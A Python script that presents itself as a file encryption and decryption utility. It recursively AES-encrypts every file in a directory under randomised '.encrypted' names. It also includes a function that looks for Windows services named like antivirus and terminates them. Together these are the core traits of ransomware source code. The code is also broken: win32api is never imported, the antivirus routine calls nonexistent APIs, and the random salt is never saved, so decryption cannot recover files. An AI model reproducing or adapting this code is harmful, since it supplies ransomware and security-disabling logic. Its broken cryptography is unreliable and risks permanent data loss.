import os
import random
import string
import logging
import argparse
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt

# Configure logging
logging.basicConfig(level=logging.INFO)

def detect_antivirus():
    services = win32api.EnumServiceStatus(None, 0, win32con.SC_MANAGER_CONNECT)
    for service in services:
        for svc in service.services:
            if 'antivirus' in svc.name:
                win32api.TerminateService(svc.service_name, 1)

def generate_key(password='YourStrongPasswordHere', salt_length=8):
    """Generate a cryptographic key using the provided password."""
    salt = os.urandom(salt_length)
    return scrypt(password.encode(), salt, 32, N=1024, r=8, p=1)

def random_string(length=8):
    """Generate a random string of fixed length."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def encrypt_and_rename(file_path, key):
    """Encrypt a file and rename it with a random string."""
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        # Ensure plaintext is a multiple of AES block size
        padding_length = AES.block_size - len(plaintext) % AES.block_size
        plaintext += bytes([padding_length]) * padding_length
        
        iv = os.urandom(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = iv + cipher.encrypt(plaintext)  # Prepend IV for decryption later

        new_filename = f'{os.path.splitext(file_path)[0]}.{random_string()}.encrypted'
        with open(new_filename, 'wb') as ef:
            ef.write(encrypted_data)
        
        logging.info(f'Successfully encrypted and renamed to {new_filename}')
    except FileNotFoundError:
        logging.error(f"Error: The file {file_path} was not found.")
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")

def decrypt_file(encrypted_file_path, key):
    """Decrypt an encrypted file."""
    try:
        with open(encrypted_file_path, 'rb') as ef:
            iv = ef.read(AES.block_size)
            encrypted_data = ef.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = cipher.decrypt(encrypted_data)
        
        # Remove padding
        padding_length = decrypted_data[-1]
        decrypted_data = decrypted_data[:-padding_length]
        
        new_filename = f'{os.path.splitext(encrypted_file_path)[0].replace(".encrypted", "")}.decrypted'
        with open(new_filename, 'wb') as df:
            df.write(decrypted_data)
        
        logging.info(f'Successfully decrypted to {new_filename}')
    except Exception as e:
        logging.error(f"An error occurred during decryption: {str(e)}")

def encrypt_directory(directory_path, key):
    """Encrypt all files in a directory."""
    for root, _, files in os.walk(directory_path):
        for file in files:
            full_file_path = os.path.join(root, file)
            encrypt_and_rename(full_file_path, key)

def main():
    parser = argparse.ArgumentParser(description='Encrypt or decrypt files.')
    parser.add_argument('action', choices=['encrypt', 'decrypt'], help='Action to perform: encrypt or decrypt')
    parser.add_argument('file', type=str, help='File path to encrypt or decrypt (can be a directory)')
    parser.add_argument('--password', type=str, default='YourStrongPasswordHere', help='Encryption password')
    args = parser.parse_args()
    
    key = generate_key(args.password)

    if args.action == 'encrypt':
        logging.info(f'Starting encryption for {args.file}')
        if os.path.isdir(args.file):
            encrypt_directory(args.file, key)
        else:
            encrypt_and_rename(args.file, key)
    elif args.action == 'decrypt':
        logging.info(f'Starting decryption for {args.file}')
        decrypt_file(args.file, key)

if __name__ == "__main__":
    main()
